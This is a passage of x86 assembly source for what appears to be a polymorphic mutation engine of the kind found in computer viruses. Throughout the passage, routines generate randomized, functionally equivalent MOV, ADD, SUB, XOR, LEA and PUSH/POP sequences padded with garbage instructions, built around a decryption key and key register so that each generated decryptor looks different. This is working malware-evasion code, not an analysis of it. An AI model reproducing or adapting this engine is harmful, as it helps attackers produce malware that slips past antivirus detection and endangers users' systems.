                                                            ; register in DL
                or      eax, 08080800h ;Set the other three as 08 (unreserved)
                mov     dword ptr [ebp+Index1Register], eax ; Set them as the
                                                            ; new registers
                mov     al, byte ptr [ebp+CopyOfUsedRegisters+2] ; Restore the
                mov     byte ptr [ebp+KeyRegister], al  ; key register.
                                 ; This must be for the indexed memory writes
                pop     edx
                pop     eax
                ret          ; Return
SelectOnlyTwoRegs endp

;; This function constructs a comparision between a register and a value. The
;; comparision only can be used with JZ/JNZ. BufferRegister is used to make
;; a wider variety.
DoCMP           proc
                pushad
                mov     dl, byte ptr [ebp+BufferRegister] ; Get buffer reg.
                push    edx
                cmp     dl, 8      ; If there isn't any reserved, reserve one
                jnz   @@ThereIsOneSelected
                call    SelectARegister
                mov     byte ptr [ebp+BufferRegister], al
     @@ThereIsOneSelected:

     @@Repeat:  call    Random
                and     al, 7      ; Get a random value between 0 and 7
                jz    @@Repeat     ; If 0, repeat
                cmp     al, 2
                jbe   @@PUSHXXX    ; If 1-2, make PUSH/Comp/POP
               ; jb    @@PUSHSUB
               ; jz    @@PUSHXOR
                cmp     al, 3      ; If 3, do direct CMP
                jz    @@CMP
                push    eax        ; Save EAX
                mov     dh, [ebp+Index2Register]
                mov     dl, [ebp+BufferRegister]
                call    DoMOVRegReg  ; Move the value of Index2 (the register
                                     ; to compare) to BufferRegister
                call    DoRandomGarbage  ; Make a good amount of garbage
                call    DoRandomGarbage
                pop     ecx          ; Restore EAX in ECX
                mov     dl, [ebp+BufferRegister] ; DL=BufferRegister
                mov     eax, [ebp+InitialValue]  ; EAX=Initial value of Index2
                cmp     cl, 5
                jb    @@MOVSUB   ; CL=4, then do SUB BufferRegister,Value
                                 ;            or ADD BufferRegister,NEG(Value)
                jz    @@MOVCMP   ; CL=5, then do CMP BufferRegister,Value
     @@MOVXOR:  call    DoXOR    ; CL=6, then do XOR BufferRegister,Value
                jmp   @@End     ; Jump and finish
     @@MOVSUB:  call    DoSUB    ; Make that SUB/ADD
                jmp   @@End     ; Jump and finish
     @@MOVCMP:  or      dl, dl   ; If BufferRegister=EAX, then jump to store
                jz    @@CMP_EAX  ; its own opcode
                push    eax
                mov     ax, 0F881h  ; Opcode of CMP Reg,Value
                or      ah, dl      ; Set the register to the opcode
                stosw            ; Store the opcode
                jmp   @@J01      ; Jump to store the value

     @@CMP_EAX: push    eax
                mov     al, 3Dh  ; AL=Opcode of CMP EAX,Value
                stosb            ; Store it
         @@J01: pop     eax
                stosd            ; Store the value to compare
                jmp   @@End      ; Return

     @@CMP:     call    RandomFlags
                jz    @@Direct_CMPRegReg
                mov     dl, [ebp+Index2Register] ; Get the Index2 register
                mov     eax, [ebp+InitialValue]  ; EAX=Value to compare
                jmp   @@MOVCMP      ; Jump here to do a direct CMP
     @@Direct_CMPRegReg:
                call    DoRandomGarbage
                mov     dl, [ebp+BufferRegister]
                mov     eax, [ebp+InitialValue]
                call    DoMOV
                call    DoRandomGarbage
                mov     dh, [ebp+Index2Register]
                call    RandomFlags
                jz    @@D_CMPRR03
                js    @@D_CMPRRXOR
       @@D_CMPRRSUB:
                mov     ax, 0C029h
                jmp   @@D_CMPRR02
       @@D_CMPRRXOR:
                mov     ax, 0C031h
       @@D_CMPRR02:
                call    RandomFlags
                jz    @@D_CMPRR01
                xchg    dh, dl
                add     al, 2
       @@D_CMPRR01:
                jmp   @@D_CMPRR04
       @@D_CMPRR03:
                mov     ax, 0C039h
                call    RandomFlags
                jz    @@D_CMPRR05
                xchg    dh, dl
       @@D_CMPRR05:
                js    @@D_CMPRR04
                add     al, 2
       @@D_CMPRR04:
                or      ah, dl
                shl     dh, 3
                or      ah, dh
                stosw
                jmp   @@End

   ;; Here we make PUSH Index2Register / XOR/SUB(ADD) Index2Register,(-)Value /
   ;;              / POP Index2Register
     @@PUSHXXX: mov     dl, [ebp+Index2Register]
                mov     al, 50h   ; Make a PUSH Index2Register
                add     al, dl
                stosb             ; Store that opcode
                call    DoRandomGarbage  ; Make garbage
                mov     eax, [ebp+InitialValue] ; (get the value to compare)
                call    RandomFlags ; XOR or SUB/ADD?
                jz    @@PUSHSUB   ; Do SUB
     @@PUSHXOR: js    @@PUSHXOR_D
                mov     dh, dl
                mov     dl, [ebp+BufferRegister]
                call    DoMOV
                call    DoRandomGarbage
                call    RandomFlags
                jz    @@PUSHXOR_R
                xchg    dh, dl
   @@PUSHXOR_R: call    DoXORRegReg
                jmp   @@PUSH_01
   @@PUSHXOR_D: call    DoXOR     ; Do a XOR with that value
                jmp   @@PUSH_01   ; Jump to POP the register
     @@PUSHSUB: js    @@PUSHSUB_D
                mov     dh, dl
                mov     dl, [ebp+BufferRegister]
                call    DoMOV
                call    DoRandomGarbage
                call    RandomFlags
                jz    @@PUSHSUB_R
                xchg    dh, dl
   @@PUSHSUB_R: call    DoSUBRegReg
                jmp   @@PUSH_01
   @@PUSHSUB_D: call    DoSUB     ; Make a SUB Reg,Value or ADD Reg,NEG(Value)
     @@PUSH_01: ;we don't make garbage here, since I have to mantain the flags
                ;of the comparision
                mov     al, 58h  ; Make the POP Index2Register
                add     al, [ebp+Index2Register]
                stosb            ; Store the opcode
            ;    jmp   @@End

       @@End:   pop     edx     ; Restore BufferRegister (if it was selected)
                mov     byte ptr [ebp+BufferRegister], dl
                mov     [esp+S_EDI], edi  ; Conserve EDI when POPAD
                popad
                ret     ; Return
DoCMP           endp

;; This very used function performs a move operation with the register in
;; DL and the value in EAX. It can do a MOV Reg,Value, a LEA Reg,[Value] or
;; a PUSH Value/Garbage/POP Reg. Sometimes it doesn't give the correct value
;; just at the beginning, so the function adjusts the value with a sucession
;; of XORs, ADDs or SUBs to get the correct value.
DoMOV           proc
                pushad               ; Save registers
                inc     byte ptr [ebp+MOVingRecursLevel]
                cmp     byte ptr [ebp+MOVingRecursLevel], 5
                jae   @@NoRecursives
       @@RepeatRandom:
                push    eax
                call    Random
                mov     ebx, eax
                pop     eax
                and     bl, 7
                jz    @@MOVDirect
                cmp     bl, 2
                jb    @@LEA
                jz    @@LEA2
                cmp     bl, 4
                jb    @@PUSHPOP
                jz    @@MOVMEM
                cmp     bl, 5
                ja    @@RepeatRandom

     @@Adjust:  mov     ebx, eax
                call    Random
                and     al, 3
                jz    @@NoRecursives2
                mov     [ebp+@@AdjustTimes], al
                call    Random
                mov     ecx, eax
                push    dword ptr [ebp+@@AdjustTimes]
                call    DoMOV
                pop     dword ptr [ebp+@@AdjustTimes]
   @@Adj_Loop01:
                push    dword ptr [ebp+@@AdjustTimes]
                call    Random
   @@Adj_OtherFlags:
                call    RandomFlags
                jz    @@Adj_01
                js    @@Adj_XOR
   @@Adj_ADD:   push    eax
                call    Random
                and     eax, 0Fh
                pop     eax
                jnz   @@Adj_ADD01
                cmp     byte ptr [ebp+KeyIsInit], 1
                jnz   @@Adj_ADD01
                add     ecx, [ebp+DecryptKey]
                mov     dh, [ebp+KeyRegister]
                call    DoADDRegReg
                jmp   @@Adj_Next01
   @@Adj_ADD01: add     ecx, eax
                call    DoADD
                jmp   @@Adj_Next01
   @@Adj_XOR:   push    eax
                call    Random
                and     eax, 0Fh
                pop     eax
                jnz   @@Adj_XOR01
                cmp     byte ptr [ebp+KeyIsInit], 1
                jnz   @@Adj_XOR01
                xor     ecx, [ebp+DecryptKey]
                mov     dh, [ebp+KeyRegister]
                call    DoXORRegReg
                jmp   @@Adj_Next01
   @@Adj_XOR01: xor     ecx, eax
                call    DoXOR
                jmp   @@Adj_Next01
   @@Adj_01:    js    @@Adj_OtherFlags
   @@Adj_SUB:   push    eax
                call    Random
                and     eax, 0Fh
                pop     eax
                jnz   @@Adj_SUB01
                cmp     byte ptr [ebp+KeyIsInit], 1
                jnz   @@Adj_SUB01
                sub     ecx, [ebp+DecryptKey]
                mov     dh, [ebp+KeyRegister]
                call    DoSUBRegReg
                jmp   @@Adj_Next01
   @@Adj_SUB01: sub     ecx, eax
                call    DoSUB

       @@Adj_Next01:
                call    DoRandomGarbage
                pop     dword ptr [ebp+@@AdjustTimes]
                dec     byte ptr [ebp+@@AdjustTimes]
                jnz   @@Adj_Loop01

       ;; ECX=Current value, EBX=Desired value
       @@Adj_Other:
                call    Random
                and     al, 3
                jz    @@Adj_Other
                cmp     al, 2
                jb    @@Adj_FinalADD
                jz    @@Adj_FinalXOR
    @@Adj_FinalSUB:
                sub     ecx, ebx
                mov     eax, ecx
                call    DoSUB
                jmp   @@End
    @@Adj_FinalADD:
                sub     ebx, ecx
                mov     eax, ebx
                call    DoADD
                jmp   @@End
    @@Adj_FinalXOR:
                xor     ebx, ecx
                mov     eax, ebx
                call    DoXOR
                jmp   @@End

     @@AdjustTimes      db      0
                db      3 dup (0) ; Padding

     @@MOVDirect:
                xchg    ebx, eax
                mov     al, 0B8h
                add     al, dl
                stosb
                xchg    eax, ebx
                stosd
                jmp   @@End
     @@LEA:     xchg    ebx, eax
                mov     ax, 058Dh
                shl     dl, 3
                or      ah, dl
                shr     dl, 3
                stosw
                xchg    ebx, eax
                stosd
                jmp   @@End
     @@LEA2:    cmp     byte ptr [ebp+KeyIsInit], 1
                jnz   @@LEA
                xchg    ebx, eax
                mov     ax, 008Dh
                shl     dl, 3
                or      ah, dl
                shr     dl, 3
                or      ah, [ebp+KeyRegister]
                sub     ebx, [ebp+DecryptKey]
                cmp     ebx, 7Fh
                jbe   @@LEA2_b
                cmp     ebx, 0FFFFFF80h
                jbe   @@LEA2_d
         @@LEA2_b:
                or      ah, 40h
                stosw
                xchg    ebx, eax
                stosb
                jmp   @@End
         @@LEA2_d:
                or      ah, 80h
                stosw
                xchg    ebx, eax
                stosd
                jmp   @@End

    @@PUSHPOP:  call    DoPUSHValue
                call    DoRandomGarbage
                call    DoPOPReg
                jmp   @@End

    @@MOVMEM:   call    GetAndReserveVar
                or      ebx, ebx
                jz    @@NoRecursives
                call    DoMOVMemValue
                call    DoRandomGarbage
                call    DoMOVRegMem
                call    ReleaseVar
                jmp   @@End

      @@NoRecursives2:
                mov     eax, ebx
      @@NoRecursives:
                push    eax
                call    Random
                mov     ebx, eax
                pop     eax
                and     bl, 3
                jz    @@NoRecursives
                cmp     bl, 2
                jb    @@MOVDirect
                jz    @@LEA
                jmp   @@LEA2

         @@End: dec     byte ptr [ebp+MOVingRecursLevel]
                and     edx, 0FFh  ; Mark this register as "touched" (since we
                mov     byte ptr [ebp+edx+TouchedRegisters], 1 ; moved a value
                                                               ; to it)
                mov     [esp+S_EDI], edi  ; Don't restore EDI when we do POPAD
                popad
                ret        ; Return
DoMOV           endp

DoPUSHValue     proc
                pushad
                inc     byte ptr [ebp+MOVingRecursLevel]
                cmp     byte ptr [ebp+MOVingRecursLevel], 5
                jae   @@DirectPUSH
                call    RandomFlags
                jz    @@DirectPUSH
     @@Other:   call    GetAndReserveVar
                or      ebx, ebx
                jz    @@DirectPUSH
                call    DoMOVMemValue
                call    DoRandomGarbage
                call    DoPUSHMem
                call    ReleaseVar
                jmp   @@End

     @@DirectPUSH:
                push    eax
                cmp     eax, 7Fh
                jbe   @@PUSHByte
                cmp     eax, 0FFFFFF80h
                jae   @@PUSHByte
                mov     al, 68h
                stosb
                pop     eax
                stosd
                jmp   @@End
       @@PUSHByte:
                mov     al, 6Ah
                stosb
                pop     eax
                stosb

       @@End:   dec     byte ptr [ebp+MOVingRecursLevel]
                mov     [esp+S_EDI], edi
                popad
                ret
DoPUSHValue     endp

;; This function performs an addition of the value in EAX to the register in
;; DL. The addition can be done with:
;; ADD Reg,Value
;; LEA Reg,[Reg+Value]
;; SUB Reg,NEG(Value)
DoADD           proc
                pushad
                inc     byte ptr [ebp+MOVingRecursLevel]
                cmp     byte ptr [ebp+MOVingRecursLevel], 5
                jae   @@NoRecursives

                cmp     eax, 1
                jz    @@SelectINC
                cmp     eax, -1
                jz    @@SelectDEC
        @@Others:
                cmp     byte ptr [ebp+FlagNoLEA], 1
                jz    @@NoLEAs

        @@OtherRandom:
                push    eax
                call    Random
                mov     ebx, eax
                pop     eax
                and     bl, 7
                jz    @@ADDDirect
                cmp     bl, 2
                jb    @@SUBDirect
                jz    @@LEA
                cmp     bl, 4
                jb    @@LEA2
                jz    @@MOVMEM
                cmp     bl, 5
                ja    @@OtherRandom
     @@MOVMEM2: call    GetAndReserveVar
                or      ebx, ebx
                jz    @@NoRecursives
                call    DoMOVMemValue
                call    DoRandomGarbage
                call    DoADDRegMem
                call    ReleaseVar
                jmp   @@End
     @@MOVMEM:  call    GetAndReserveVar
                or      ebx, ebx
                jz    @@NoRecursives
                neg     eax
                call    DoMOVMemValue
                call    DoRandomGarbage
                call    DoSUBRegMem
                call    ReleaseVar
                jmp   @@End

     @@ADDDirect:
                mov     ebx, eax
                or      dl, dl
                jz    @@ADDDirectEAX
                cmp     ebx, 7Fh
                jbe   @@ADDDirectByte
                cmp     ebx, 0FFFFFF80h
                jae   @@ADDDirectByte
                mov     ax, 0C081h
       @@CommonWithADD1:
                or      ah, dl
                stosw
                xchg    ebx, eax
                stosd
                jmp   @@End
       @@ADDDirectByte:
                mov     ax, 0C083h
       @@CommonWithADD2:
                or      ah, dl
                stosw
                xchg    ebx, eax
                stosb
                jmp   @@End
      @@ADDDirectEAX:
                mov     al, 05h
                stosb
                xchg    ebx, eax
                stosd
                jmp   @@End

      @@SUBDirect:
                neg     eax
                mov     ebx, eax
                or      dl, dl
                jz    @@SUBDirectEAX
                cmp     ebx, 7Fh
                jbe   @@SUBDirectByte
                cmp     ebx, 0FFFFFF80h
                jae   @@SUBDirectByte
                mov     ax, 0E881h
                jmp   @@CommonWithADD1
        @@SUBDirectByte:
                mov     ax, 0E883h
                jmp   @@CommonWithADD2
        @@SUBDirectEAX:
                mov     al, 2Dh
                stosb
                xchg    ebx, eax
                stosd
                jmp   @@End

      @@LEA:    mov     ebx, eax
                mov     ax, 008Dh
                or      ah, dl
                shl     dl, 3
                or      ah, dl
                cmp     ebx, 7Fh
                jbe   @@LEA_sb
                cmp     ebx, 0FFFFFF80h
                jae   @@LEA_sb
                or      ah, 80h
                stosw
                xchg    ebx, eax
                stosd
                jmp   @@End
      @@LEA_sb: or      ah, 40h
                stosw
     @@LEA_sb2: xchg    ebx, eax
                stosb
                jmp   @@End

      @@LEA2:   cmp     byte ptr [ebp+KeyIsInit], 1
                jnz   @@LEA
                sub     eax, [ebp+DecryptKey]
                mov     ebx, eax
                cmp     ebx, 7Fh
                jbe   @@LEA2b
                cmp     ebx, 0FFFFFF80h
                jae   @@LEA2b
                mov     ax, 848Dh
      @@LEA2_Common:
                shl     dl, 3
                or      ah, dl
                shr     dl, 3
                stosw
                mov     dh, [ebp+KeyRegister]
                call    RandomFlags
                jz    @@LEA2_X
                xchg    dh, dl
      @@LEA2_X: shl     dh, 3
                mov     al, dh
                or      al, dl
                stosb
                cmp     ebx, 7Fh
                jbe   @@LEA_sb2
                cmp     ebx, 0FFFFFF80h
                jae   @@LEA_sb2
                xchg    ebx, eax
                stosd
                jmp   @@End

      @@LEA2b:  mov     ax, 448Dh
                jmp   @@LEA2_Common

      @@SelectINC2:
                call    RandomFlags
                jz    @@INC01
                js    @@NextNoRecurs
                jmp   @@INC01
      @@SelectINC:
                call    RandomFlags
                jz    @@INC01
                js    @@Others
       @@INC01: mov     al, 40h
                jmp   @@CommonWithDEC

      @@NoLEAs: push    eax
                call    Random
                mov     ebx, eax
                pop     eax
                and     bl, 3
                jz    @@ADDDirect
                cmp     bl, 2
                jb    @@SUBDirect
                jz    @@MOVMEM
                jmp   @@MOVMEM2
                
      @@NoRecursives:
                cmp     eax, 1
                jz    @@SelectINC2
                cmp     eax, -1
                jz    @@SelectDEC2
      @@NextNoRecurs:
                cmp     byte ptr [ebp+FlagNoLEA], 1
                jnz   @@NoRecursives2
                call    RandomFlags
                jz    @@ADDDirect
                jmp   @@SUBDirect

      @@NoRecursives2:
                call    RandomFlags
                jz    @@0_
                js    @@ADDDirect
                jmp   @@SUBDirect
         @@0_:  js    @@LEA
                jmp   @@LEA2
                
      @@SelectDEC2:
                call    RandomFlags
                jz    @@DEC01
                js    @@NextNoRecurs
                jmp   @@DEC01

      @@SelectDEC:
                call    RandomFlags
                jz    @@DEC01
                js    @@Others
      @@DEC01:  mov     al, 48h
      @@CommonWithDEC:
                or      al, dl
                stosb

        @@End:  dec     byte ptr [ebp+MOVingRecursLevel]
                mov     [esp+S_EDI], edi ; Conserve EDI
                popad
                ret              ; Return
DoADD           endp

;; Flag that we use when making comparisions, since LEA doesn't modify flags
FlagNoLEA       db      0

;; This function makes a subtraction of the value in EAX to the register in
;; DL. Since this function is only called when we make comparisions, we have
;; to assure that LEA isn't used, so I put a flag to avoid LEAs. This function
;; then negates the value and calls to DoADD, but avoiding LEAs.
DoSUB           proc
                push    eax
                neg     eax                          ; Negate value
                mov     byte ptr [ebp+FlagNoLEA], 1  ; Don't allow LEA
                call    DoADD                        ; Call to DoADD
                mov     byte ptr [ebp+FlagNoLEA], 0  ; Allow LEA again
                pop     eax
                ret                         ; Return
DoSUB           endp

;; This function only makes a XOR Reg,Value. There isn't any work-around to
;; make XORs (well, you can use the fact that a XOR is
;; [(X AND Y) OR (NEG(X) AND NEG(Y)], which it's a bitch to code :).
DoXOR           proc
                pushad
                inc     byte ptr [ebp+MOVingRecursLevel]
                cmp     byte ptr [ebp+MOVingRecursLevel], 5
                jae   @@DirectXOR

                call    GetAndReserveVar
                or      ebx, ebx
                jz    @@DirectXOR
                call    DoMOVMemValue
                call    DoRandomGarbage
                call    DoXORRegMem
                call    ReleaseVar
                jmp   @@End

       @@DirectXOR:
                push    eax
                or      dl, dl   ; Do we use EAX?
                jz    @@EAX      ; Then use the EAX opcode
                mov     ax, 0F081h ; Opcode of XOR Reg,Value
                or      ah, dl     ; Bind the register to the opcode
                stosw              ; Store the opcode
                jmp   @@J01        ; Jump to continue
        @@EAX:  mov     al, 35h  ; Opcode of XOR EAX,Value
                stosb            ; Store it
        @@J01:  pop     eax      ; Get the value to XOR from stack
                stosd            ; Complete the instruction

       @@End:   dec     byte ptr [ebp+MOVingRecursLevel]
                mov     [esp+S_EDI], edi ; Conserve EDI
                popad
                ret              ; Return
DoXOR           endp

;; EBX=Memory address, EAX=Value
DoMOVMemValue   proc
                pushad
                inc     byte ptr [ebp+MOVingRecursLevel]
                cmp     byte ptr [ebp+MOVingRecursLevel], 5
                jae   @@NoRecursives
                push    eax
                call    Random
                mov     ecx, eax
                pop     eax
                and     cl, 3
                jz    @@MOVDirect
                cmp     cl, 2
                jb    @@MOVDirect2
                jz    @@PUSHPOP

        @@AdjustMem:
                mov     ecx, eax        ; ECX=Destiny (=EAX)
                call    Random
                and     al, 3
                jz    @@NoRecursives2
                mov     byte ptr [ebp+@@AdjustTimes], al
                call    Random
                mov     edx, eax        ; EDX=Initial value
                push    dword ptr [ebp+@@AdjustTimes]
                call    DoMOVMemValue   ; Move this to [EBX]
                pop     dword ptr [ebp+@@AdjustTimes]
       @@Adj_Loop01:
                push    dword ptr [ebp+@@AdjustTimes]
                call    Random
                mov     esi, eax        ; ESI=Number that modifies
       @@Adj_Loop02:
                call    Random
                and     al, 3
                jz    @@Adj_Loop02
                cmp     al, 2
                jb    @@Adj_ADD
                jz    @@Adj_XOR
     @@Adj_SUB: cmp     byte ptr [ebp+KeyIsInit], 1
                jnz   @@Adj_SUB01
                call    Random
                and     al, 0Fh
                jnz   @@Adj_SUB01
                sub     edx, [ebp+DecryptKey]
                push    edx
                mov     dl, [ebp+KeyRegister]
                call    DoSUBMemReg
                pop     edx
                jmp   @@Adj_Next01
   @@Adj_SUB01: sub     edx, esi       ; Initial=Initial-Random
                mov     eax, esi
                call    DoSUBMemValue  ; Do SUB [<EBX>],<ESI>
                jmp   @@Adj_Next01

     @@Adj_ADD: cmp     byte ptr [ebp+KeyIsInit], 1
                jnz   @@Adj_ADD01
                call    Random
                and     al, 0Fh
                jnz   @@Adj_ADD01
                add     edx, [ebp+DecryptKey]
                push    edx
                mov     dl, [ebp+KeyRegister]
                call    DoADDMemReg
                pop     edx
                jmp   @@Adj_Next01
   @@Adj_ADD01: add     edx, esi       ; Initial=Initial+Random
                mov     eax, esi
                call    DoADDMemValue  ; Do ADD [<EBX>],<ESI>
                jmp   @@Adj_Next01

     @@Adj_XOR: cmp     byte ptr [ebp+KeyIsInit], 1
                jnz   @@Adj_XOR01
                call    Random
                and     al, 0Fh
                jnz   @@Adj_XOR01
                xor     edx, [ebp+DecryptKey]
                push    edx
                mov     dl, [ebp+KeyRegister]
                call    DoXORMemReg
                pop     edx
                jmp   @@Adj_Next01
   @@Adj_XOR01: xor     edx, esi
                mov     eax, esi
                call    DoXORMemValue

         @@Adj_Next01:
                call    DoRandomGarbage
                pop     dword ptr [ebp+@@AdjustTimes]
                dec     byte ptr [ebp+@@AdjustTimes]
                jnz   @@Adj_Loop01

         @@Adj_Loop03:
                call    Random
                and     al, 3
                jz    @@Adj_Loop03
                cmp     al, 2
                jb    @@Adj_FinalADD
                jz    @@Adj_FinalSUB
       @@Adj_FinalXOR:
                xor     ecx, edx        ; EDX=Current value XOR final value
                mov     eax, ecx
                call    DoXORMemValue
                jmp   @@End
       @@Adj_FinalADD:
                sub     ecx, edx
                mov     eax, ecx
                call    DoADDMemValue
                jmp   @@End
       @@Adj_FinalSUB:
                sub     edx, ecx
                mov     eax, edx
                call    DoSUBMemValue
                jmp   @@End

     @@AdjustTimes      db      0
                db      3 dup (0) ; Padding

    @@PUSHPOP:  call    DoPUSHValue
                call    DoRandomGarbage
                call    DoPOPMem
                jmp   @@End

   @@MOVDirect: push    eax
                mov     ax, 05C7h
                stosw
                pop     eax
                xchg    ebx, eax
                stosd         ; First <EBX>
                xchg    ebx, eax
                stosd
                jmp   @@End

  @@MOVDirect2: cmp     byte ptr [ebp+KeyIsInit], 1
                jnz   @@MOVDirect
                push    eax
                mov     ax, 00C7h
                or      ah, [ebp+KeyRegister]
                sub     ebx, [ebp+DecryptKey]
                cmp     ebx, 7Fh
                jbe   @@Byte
                cmp     ebx, 0FFFFFF80h
                jae   @@Byte
                or      ah, 80h
                stosw
                pop     eax
                xchg    ebx, eax
                stosd
                xchg    ebx, eax
                stosd
                jmp   @@End
        @@Byte: or      ah, 40h
                stosw
                pop     eax
                xchg    ebx, eax
                stosb
                xchg    ebx, eax
                stosd
                jmp   @@End
                
    @@NoRecursives2:
                mov     eax, ecx
    @@NoRecursives:
                call    RandomFlags
                jz    @@MOVDirect
                jmp   @@MOVDirect2

     @@End:     dec     byte ptr [ebp+MOVingRecursLevel]
                mov     [esp+S_EDI], edi
                popad
                ret
DoMOVMemValue   endp

DoADDMemReg     proc
                mov     byte ptr [ebp+OpcodeToUseInXXXFunc], 01
                jmp     DoXXXWithMemAndReg
DoADDMemReg     endp

;; Attention: This routine shouldn't be called directly!
DoXXXWithMemAndReg proc
                pushad
                call    RandomFlags
                jz    @@Direct

                cmp     byte ptr [ebp+KeyIsInit], 1
                jnz   @@Direct
                sub     ebx, [ebp+DecryptKey]
                xor     ah, ah
                mov     al, [ebp+OpcodeToUseInXXXFunc]
                shl     dl, 3
                or      ah, dl
                or      ah, [ebp+KeyRegister]
                cmp     ebx, 7Fh
                jbe   @@Byte
                cmp     ebx, 0FFFFFF80h
                jae   @@Byte
                or      ah, 80h
                stosw
                mov     eax, ebx
                stosd
                jmp   @@End
      @@Byte:   or      ah, 40h
                stosw
                mov     eax, ebx
                stosb
                jmp   @@End

    @@Direct:   mov     ah, 05h
                mov     al, [ebp+OpcodeToUseInXXXFunc]
                shl     dl, 3
                or      ah, dl
                stosw
                mov     eax, ebx
                stosd

      @@End:    mov     [esp+S_EDI], edi
                popad
                ret
DoXXXWithMemAndReg endp

DoADDRegMem     proc
                mov     byte ptr [ebp+OpcodeToUseInXXXFunc], 03
                jmp     DoXXXWithMemAndReg
DoADDRegMem     endp

DoSUBRegMem     proc
                mov     byte ptr [ebp+OpcodeToUseInXXXFunc], 2Bh
                jmp     DoXXXWithMemAndReg
DoSUBRegMem     endp

DoSUBMemReg     proc
                mov     byte ptr [ebp+OpcodeToUseInXXXFunc], 29h
                jmp     DoXXXWithMemAndReg
DoSUBMemReg     endp

DoXORRegMem     proc
                mov     byte ptr [ebp+OpcodeToUseInXXXFunc], 33h
                jmp     DoXXXWithMemAndReg
DoXORRegMem     endp

DoXORMemReg     proc
                mov     byte ptr [ebp+OpcodeToUseInXXXFunc], 31h
                jmp     DoXXXWithMemAndReg
DoXORMemReg     endp

OpcodeToUseInXXXFunc    db      0

DoADDMemValue   proc
                pushad
                push    eax
                call    Random
                mov     ecx, eax
                pop     eax
                and     cl, 3
                jz    @@ADD
                cmp     cl, 2
                jb    @@ADD2
                jz    @@SUB
     @@SUB2:    cmp     byte ptr [ebp+KeyIsInit], 1
                jnz   @@SUB
                neg     eax
                push    eax
                mov     ax, 2881h
     DoXXXMemValue_Common2:
                or      ah, [ebp+KeyRegister]
                sub     ebx, [ebp+DecryptKey]
                cmp     ebx, 7Fh
                jbe   @@SUB2b
                cmp     ebx, 0FFFFFF80h
                jae   @@SUB2b
                or      ah, 80h
     DoXXXMemValue_Common:
                pop     ecx
                stosw
                xchg    ebx, eax
                stosd
                xchg    ecx, eax
                stosd
                jmp   @@End
       @@SUB2b: or      ah, 40h
                pop     ecx
                stosw
                xchg    ebx, eax
                stosb
                xchg    ecx, eax
                stosd
                jmp   @@End
       @@SUB:   neg     eax
                push    eax
                mov     ax, 2D81h
                jmp     DoXXXMemValue_Common
       @@ADD:   push    eax
                mov     ax, 0581h
                jmp     DoXXXMemValue_Common
       @@ADD2:  cmp     byte ptr [ebp+KeyIsInit], 1
                jnz   @@ADD
                push    eax
                mov     ax, 0081h
                jmp     DoXXXMemValue_Common2

       @@End:   mov     [esp+S_EDI], edi
                popad
                ret
DoADDMemValue   endp

DoSUBMemValue   proc
                push    eax
                neg     eax
                call    DoADDMemValue
                pop     eax
                ret
DoSUBMemValue   endp

DoXORMemValue   proc
                pushad
                call    RandomFlags
                jz    @@XOR
        @@XOR2: cmp     byte ptr [ebp+KeyIsInit], 1
                jnz   @@XOR
                push    eax
                mov     ax, 3081h
                jmp     DoXXXMemValue_Common2
        @@XOR:  push    eax
                mov     ax, 3581h
                jmp     DoXXXMemValue_Common
DoXORMemValue   endp

;; This function makes code to move the value of one register to another. This
;; task can be made with:
;; - MOV Reg1,Reg2
;; - LEA Reg1,[Reg2]
;; - PUSH Reg2/Garbage/POP Reg1
;; When calling: DL=Destiny register, DH=Source register
DoMOVRegReg     proc
                pushad
                inc     byte ptr [ebp+MOVingRecursLevel]
                cmp     byte ptr [ebp+MOVingRecursLevel], 5
                jae   @@NoRecursives

                call    Random
                and     al, 3
                jz    @@PUSHPOP
                cmp     al, 2
                jb    @@LEA
                jz    @@MOV
   @@MOVMEM:    call    GetAndReserveVar
                or      ebx, ebx
                jz    @@NoRecursives
                xchg    dh, dl
                call    DoMOVMemReg
                call    DoRandomGarbage
                xchg    dh, dl
                call    DoMOVRegMem
                call    ReleaseVar
                jmp   @@End
   @@PUSHPOP:   xchg    dh, dl
                call    DoPUSHReg
                call    DoRandomGarbage
                xchg    dh, dl
                call    DoPOPReg
                jmp   @@End
   @@LEA:       
    ;; Here we make: LEA Reg1,[Reg2]
    ;; The opcode of instruction LEA is as follows:
    ;; LEA = 8Dh+ 00(IndexAdding).000(Destiny).000(SourceInBrackets - Not 5)
    ;;  To put EBP in SourceInBrackets, IndexAdding must be 1 or 2.
                shl     dl, 3   ; Prepare the destiny register to set it to
                                ; the opcode
                cmp     dh, 5   ; Is the source register EBP?
                jz    @@LEA_EBP   ; If it is, jump
                mov     ax, 008Dh ; AX=Clean opcode of LEA
                or      ah, dl    ; Set the destiny register
                or      ah, dh    ; Set the register in brackets
                stosw             ; Store the opcode
                jmp   @@End       ; Jump to return
     @@LEA_EBP: mov     ax, 458Dh ; Opcode of LEA Reg,[EBP+something]
                or      ah, dl    ; Set the destiny register
                stosw             ; Store the opcode
                xor     al, al
                stosb             ; Store a 0 addition
                jmp   @@End       ; Jump to return

         ;; Make a MOV Reg1,Reg2
       @@MOV:   mov     ax, 0C089h ; Opcode of MOV Reg,Reg
                call    RandomFlags
                js    @@MOV_2      ; Random jump (to avoid alternative opcode)
                add     al, 2      ; Make 8B C0 as instruction, so...
                xchg    dh, dl     ; ...we have to exchange source and destiny
       @@MOV_2: shl     dh, 3      ; Set the registers to the opcode
                or      ah, dh
                or      ah, dl
                stosw              ; Store the opcode
                jmp   @@End        ; Jump to return

   @@NoRecursives:
                call    RandomFlags
                jz    @@LEA
                jmp   @@MOV

        EndRecursiveMOVing:
        @@End:  dec     byte ptr [ebp+MOVingRecursLevel]
                mov     [esp+S_EDI], edi ; Conserve EDI
                popad
                ret              ; Return
DoMOVRegReg     endp

MOVingRecursLevel       db      0

;; Returns: EBX=Address to use
;;          The returned address is reserved for prevent its using.
;;          If there are no more free memory variables, then EBX=0
GetAndReserveVar proc
                push    eax
                push    ecx
                movzx   ecx, byte ptr [ebp+GarbageRecursivity]
                lea     ecx, [ebp+8*ecx]
                call    Random
                and     eax, 7
                mov     ebx, eax
     @@Loop01:  cmp     byte ptr [ecx+eax+ReservedMemVars_F], 0
                jz    @@Found
                inc     eax
     @@Loop02:  cmp     eax, ebx
                jz    @@ReturnError
                cmp     eax, 8
                jb    @@Loop01
                xor     eax, eax
                jmp   @@Loop02
     @@Found:   mov     byte ptr [ecx+eax+ReservedMemVars_F], 1
                sub     ecx, ebp
                lea     ecx, [ebp+4*ecx]
                mov     ebx, [ecx+4*eax+ReservedMemVars_Addr]
                pop     ecx
                pop     eax
                ret
    @@ReturnError:
                xor     ebx, ebx
                pop     ecx
                pop     eax
                ret
GetAndReserveVar endp

;; In: EBX=Reserved memory address to "unlock"
